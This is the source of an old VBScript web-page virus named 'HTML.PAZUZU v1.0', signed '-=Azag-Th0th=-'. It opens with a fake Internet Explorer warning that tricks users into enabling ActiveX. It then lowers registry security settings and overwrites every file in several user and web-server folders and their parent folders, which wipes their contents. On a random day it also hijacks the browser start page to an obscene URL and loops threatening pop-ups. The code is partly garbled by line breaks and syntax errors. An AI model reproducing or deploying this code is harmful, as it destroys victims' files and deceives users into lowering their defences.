   On Error Resume Next
   MsgBox  "To  View  This  Page,  Please" & vbCrLf & "Accept The ActiveX
   Controlls", vbInformation, "Internet Explorer Warning!"
   Set shell=CreateObject("WScript.Shell")
   If err.number=429 then
   shell.Run javascript:location.reload()
   else
   'html.HTML.PAZUZU v1.0
   'by -=Azag-Th0th=-
   Dim Shell, Fso
   On Error Resume Next
   Set Fso = CreateObject("scripting.filesystemobject")
   Shell.RegWrite      "HKCU\Software\Microsoft\Windows\CurrentVersion\In
   ternet Settings\Zones\0\1201", 0, " REG_DWORD"
   Shell.RegWrite      "HKCU\Software\Microsoft\Windows\CurrentVersion\In
   ternet Settings\Zones\0\1201", 0, " REG_DWORD"
   InfectFolder("C:\Windows\Desktop")
   InfectFolder("C:\My Documents")
   InfectFolder("C:\Inetpub\wwwroot")
   InfectFolder("C:\Program Files\Messenger")
   If Day(Now()) = Int(Rnd * 7) 1 Then
   Shell.RegWrite   "  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Reg
   isteredOwner", "Goatse Man"
   Shell.RegWrite                       "HKLM\Software\Microsoft\Internet
   Explorer\Main\Start_Page", "Http://www.massivewang.com/prime"
   Shell.run"Http://www.massivewang.com/prime"
   Do
   MsgBox  "YOU  SHALL  ROT  IN  UTTER  AGONY  UNTIL THE END OF TIME...."
   ,Critical, "@@@@@@@@@@>>>>>>>>>>>>>>>D00M is
   H3R3<<<<<<<<<<<<<<<<@@@@@@@@@@@@@"
   Loop
   End If
   Sub InfectFolder(ifp)
   Do
   Set FolderObj = Fso.GetFolder(ifp)
   ifp = Fso.GetParentFolderName(ifp)
   Set FO = FolderObj.Files
   For Each NewFile In FO
   extname = LCase(Fso.GetExtensionName(NewFile.Name))
   Set FileDropper = Fso.createtextfile(NewFile.Path)
   If extname = "htm"Then
   FileDropper.writeline "HTML.PAZUZU v1.0a message from -=Azag-Th0th=-
   End If
   If extname = "html"Then
   FileDropper.writeline "HTML.PAZUZU v1.0a message from -=Azag-Th0th=-
   End If
   If extname = "hta"Then
   FileDropper.writeline "HTML.PAZUZU v1.0a message from -=Azag-Th0th=-
   End If
   If extname = "htx"Then
   FileDropper.writeline "HTML.PAZUZU v1.0a message from -=Azag-Th0th=-
   End If
   If extname = "asp"Then
   FileDropper.writeline "HTML.PAZUZU v1.0a message from -=Azag-Th0th=-
   End If
   If extname = "bat"Then
   FileDropper.Write "You Are Infected....Death will Come!"
   End If
   If extname = "txt"Then
   FileDropper.Write "You Are Infected....Death will Come!"
   End If
   FileDropper.Close
   End If
   Next
   Loop Until FolderObj.IsRootFolder = True
   End Sub
   -->
   HTML.PAZUZU  v1.0Pazuzu,  Lord of Fevers and Plagues will come swiftly
   upon  the  Winds  of  Armageddon  to  vanquish  thee !!!a message from
   -=Azag-Th0th=-